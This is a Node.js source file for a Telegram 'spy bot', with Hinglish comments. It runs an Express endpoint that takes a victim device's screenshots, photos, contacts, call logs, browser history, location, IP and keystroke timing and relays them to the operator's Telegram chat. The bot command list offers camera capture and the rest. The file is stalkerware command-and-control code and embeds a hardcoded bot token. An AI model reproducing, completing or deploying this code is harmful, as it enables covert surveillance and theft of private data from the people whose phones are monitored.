const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const express = require('express');

const token = '8811118034:AAHr5UjOeT43-D4zPadC80V6dmQpgsyqIcM';
const YOUR_USER_ID = 2062068620;
const bot = new TelegramBot(token, { polling: true });
const app = express();
app.use(express.json());

// App se data aayega → Bot ko bhejo
let deviceData = {};

app.post('/api/device-data', (req, res) => {
    const { type, data, chatId } = req.body;
    deviceData = { type, data };
    
    if (type === 'photo') {
        bot.sendPhoto(chatId, data);
    } else if (type === 'snapshot') {
        bot.sendPhoto(chatId, data);
    } else if (type === 'contacts') {
        bot.sendMessage(chatId, data);
    } else if (type === 'call_logs') {
        bot.sendMessage(chatId, data);
    } else if (type === 'browser_history') {
        bot.sendMessage(chatId, data);
    } else if (type === 'battery') {
        bot.sendMessage(chatId, data);
    } else if (type === 'location') {
        bot.sendMessage(chatId, data);
    } else if (type === 'ip') {
        bot.sendMessage(chatId, data);
    } else if (type === 'status') {
        bot.sendMessage(chatId, data);
    } else if (type === 'key_time') {
        bot.sendMessage(chatId, data);
    } else if (type === 'online_status') {
        bot.sendMessage(chatId, data);
    }
    res.json({ success: true });
});

// Bot ko commands sunna hai
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    bot.sendMessage(chatId, "Welcome to Burhan Spy Bot! \n\nAvailable Commands:\n/snapshot - Screen Shot\n/front_cam - Front Camera\n/back_cam - Back Camera\n/contacts - Contacts\n/photos - Photos and Videos\n/call_logs - Call Logs\n/browser_history - Browser History\n/battery - Battery %\n/location - Location\n/ip - Original IP\n/status - Online/Offline Status\n/key_time - Key Time Status");
});

bot.onText(/\/snapshot/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) {
        bot.sendMessage(chatId, "⛔ Access Denied!");
        return;
    }
    // App ko command bhejo
    axios.get('http://YOUR_SERVER_URL/api/commands')
        .then(response => {
            bot.sendPhoto(chatId, deviceData.data);
        })
        .catch(error => {
            bot.sendMessage(chatId, "Snapshot fail ho gaya!");
        });
});

// Authorization check
function isAuthorized(msg) {
    return msg.from.id === YOUR_USER_ID;
}

app.get('/api/status', (req, res) => {
    res.json({ status: "Device Online" });
});

app.listen(3000, () => {
    console.log("Server running on port 3000");
});
